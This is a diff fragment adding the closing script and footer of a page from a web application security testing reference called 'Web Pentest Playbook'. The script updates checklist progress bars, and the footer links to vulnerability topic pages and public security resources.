+  document.querySelectorAll('.checklist-wrap').forEach(w => {
+    const all = w.querySelectorAll('input[type=checkbox]'), done = w.querySelectorAll('input:checked');
+    const m = w.querySelector('.progress-mini'), b = w.querySelector('.progress-bar');
+    if (m) m.textContent = done.length+'/'+all.length;
+    if (b) b.style.width = (all.length ? done.length/all.length*100 : 0)+'%';
+  });
+}
+updateProgress();
+</script>
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div class="footer-brand">
+        <a href="../index.html" class="footer-logo-link">
+          <div class="footer-logo-icon">
+            <svg viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg" width="15" height="15"><rect x="2" y="1" width="10" height="8" rx="2" stroke="#7c3aed" stroke-width="1.2"/><circle cx="7" cy="5" r="1.5" fill="#7c3aed"/></svg>
+          </div>
+          <span class="footer-logo-text">Web Pentest Playbook</span>
+        </a>
+        <p class="footer-tagline">A workflow-first reference for web application security testing.</p>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Vulnerabilities</div>
+        <a href="sqli.html" class="footer-link">SQL Injection</a>
+        <a href="xss.html" class="footer-link">XSS</a>
+        <a href="ssrf.html" class="footer-link">SSRF</a>
+        <a href="jwt.html" class="footer-link">JWT Attacks</a>
+        <a href="../index.html" class="footer-link">+ 19 more →</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">Resources</div>
+        <a href="https://portswigger.net/web-security" target="_blank" rel="noopener noreferrer" class="footer-link">PortSwigger Academy ↗</a>
+        <a href="https://owasp.org/Top10" target="_blank" rel="noopener noreferrer" class="footer-link">OWASP Top 10 ↗</a>
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer" class="footer-link">PayloadsAllTheThings ↗</a>
+        <a href="https://book.hacktricks.xyz" target="_blank" rel="noopener noreferrer" class="footer-link">HackTricks ↗</a>
+      </div>
+      <div class="footer-col">
+        <div class="footer-col-title">About</div>
+        <a href="../web-pentest-playbook.html" class="footer-link">5-Day Playbook</a>
+        <a href="../index.html" class="footer-link">All Vulnerabilities</a>
+        <a href="../thanks.html" class="footer-link">Special Thanks</a>
+        <a href="https://github.com/eligof/WebSec" target="_blank" rel="noopener noreferrer" class="footer-link">GitHub ↗</a>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span>© 2025 Web Pentest Playbook · MIT License</span>
+      <span>Inspired by <a href="../thanks.html">Tomer Hadad</a></span>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
